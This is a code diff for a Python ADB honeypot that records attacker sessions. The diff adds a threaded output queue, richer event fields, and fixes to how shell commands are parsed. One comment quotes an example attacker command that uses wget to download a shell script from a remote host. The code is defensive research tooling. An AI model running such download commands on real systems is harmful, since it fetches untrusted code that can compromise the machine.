@@ -8,6 +8,7 @@ import hashlib
 import logging
 import socket
 import struct
+import Queue
 import json
 import time
 import sys
@@ -26,6 +27,7 @@ MAX_READ_COUNT = 4096 * 4096
 MAX_EMPTY_PACKETS = 360
 
 DEVICE_ID = CONFIG.get('honeypot', 'device_id')
+log_q = Queue.Queue()
 
 def get_logger():
     LOG_FILE = CONFIG.get('honeypot', 'log_file')
@@ -50,6 +52,35 @@ def get_logger():
 
     return logger
 
+class OutputWriter(threading.Thread):
+    def __init__(self):
+        logger.debug("Creating OutputWriter!")
+        threading.Thread.__init__(self)
+        self.process = True
+        self.output_writers = []
+        for output in OUTPUT_PLUGINS:
+            output_writer = __import__('adbhoney.outputs.{}'\
+                    .format(output), globals(), locals(), ['output']).Output()
+            self.output_writers.append(output_writer)
+
+    def run(self):
+        logger.debug("Starting OutputWriter!")
+        while not log_q.empty() or self.process:
+            try:
+                log = log_q.get(timeout=.1)
+            except Queue.Empty:
+                continue
+            logger.debug("Pulled {} from log_q".format(log))
+            self.write(log)
+            log_q.task_done()
+
+    def stop(self):
+        self.process = False
+    
+    def write(self, log):
+        for writer in self.output_writers:
+            writer.write(log)
+
 class ADBConnection(threading.Thread):
     def __init__(self, conn, addr):
         threading.Thread.__init__(self)
@@ -58,11 +89,12 @@ class ADBConnection(threading.Thread):
         self.run()
 
     def report(self, obj):
-        obj['timestamp'] = time.time()
-        obj['host'] = CONFIG.get('honeypot', 'hostname')
-        for output in OUTPUT_PLUGINS:
-            output_writer = __import__('adbhoney.outputs.{}'.format(output), globals(), locals(), ['output']).Output()
-            output_writer.write(obj)
+        obj['timestamp'] = datetime.utcnow().isoformat() + 'Z'
+        obj['unixtime'] = int(time.time())
+        obj['session'] = self.session
+        obj['sensor'] = CONFIG.get('honeypot', 'hostname')
+        logger.debug("Placing {} on log_q".format(obj))
+        log_q.put(obj)
 
     def run(self):
         logger.debug("Processing new connection!")
@@ -143,14 +175,15 @@ class ADBConnection(threading.Thread):
         if DL_DIR and not os.path.exists(DL_DIR):
             os.makedirs(DL_DIR)
 
-        shasum = hashlib.sha256(f['data']).hexdigest()
-        fn = '{}.raw'.format(shasum)
+        sha256sum = hashlib.sha256(f['data']).hexdigest()
+        fn = '{}.raw'.format(sha256sum)
         fp = os.path.join(DL_DIR, fn)
         logger.info('File uploaded: {}, name: {}, bytes: {}'.format(fp, f['name'], len(f['data'])))
         obj = {
             'eventid': 'adbhoney.session.file_upload',
             'src_ip': self.addr[0],
-            'shasum': shasum,
+            'shasum': sha256sum,
+            'outfile': fp,
             'filename': f['name']
         }
         self.report(obj)
@@ -214,23 +247,25 @@ class ADBConnection(threading.Thread):
     def recv_shell_cmd(self, message):
         logger.debug("Entering recv_shell_cmd")
         self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
-
-        cmd = message.data[6:]
-        # change the WRTE contents with whatever you'd like to send to the attacker
+        
+        #command will be 'shell:cd /;wget http://someresource.com/test.sh\x00'
+        #Remove first six chars and last null byte.
+        cmd = message.data[6:-1]
         logger.info("shell command is {}, len {}".format(cmd, len(cmd)))
         if cmd in cmd_responses:
             response = cmd_responses[cmd]
         else:
             response = "{}: command not found\n".format(cmd)
 
+        # change the WRTE contents with whatever you'd like to send to the attacker
         self.send_message(protocol.CMD_WRTE, 2, message.arg0, response)
         self.send_message(protocol.CMD_CLSE, 2, message.arg0, '')
         # print the shell command that was sent
         # also remove trailing \00
         logger.info('{}\t{}'.format(self.addr[0], message.data[:-1]))
         obj = {
-            'eventid': 'adbhoney.session.command',
-            'command': cmd,
+            'eventid': 'adbhoney.command.input',
+            'input': cmd,
             'src_ip': self.addr[0],
         }
         self.report(obj)
@@ -257,14 +292,14 @@ class ADBConnection(threading.Thread):
         while True:
             try:
                 data = self.recv_data()
-                logger.debug("Received data of length: {}".format(len(data)))
             except EOFError:
                 break
 
             if not data:
                 logger.info("data is none?: {}".format(data))
                 break
-                #continue
+
+            logger.debug("Received data of length: {}".format(len(data)))
             message = self.parse_data(data)
 
             # keep a record of all the previous states in order to handle some weird cases
@@ -325,7 +360,7 @@ class ADBConnection(threading.Thread):
         obj = {
             'eventid': 'adbhoney.session.closed',
             'src_ip': self.addr[0],
-            'duration': duration,
+            'duration': '{0:.2f}'.format(duration),
         }
         self.report(obj)
         self.conn.close()
@@ -370,9 +405,13 @@ class ADBHoneyPot:
         except KeyboardInterrupt:
             logger.info('Exiting...')
             self.sock.close()
+            if output_writer:
+                output_writer.stop()
 
 def main():
     global logger
+    global output_writer
+
     # Eventually these will be filled from a config file
     parser = ArgumentParser()
 
@@ -400,6 +439,8 @@ def main():
         CONFIG.set('honeypot', 'hostname', args.sensor)
 
     logger = get_logger()
+    output_writer = OutputWriter()
+    output_writer.start()
     
     logger.info("Configuration loaded with {} as output plugins".format(OUTPUT_PLUGINS))
 
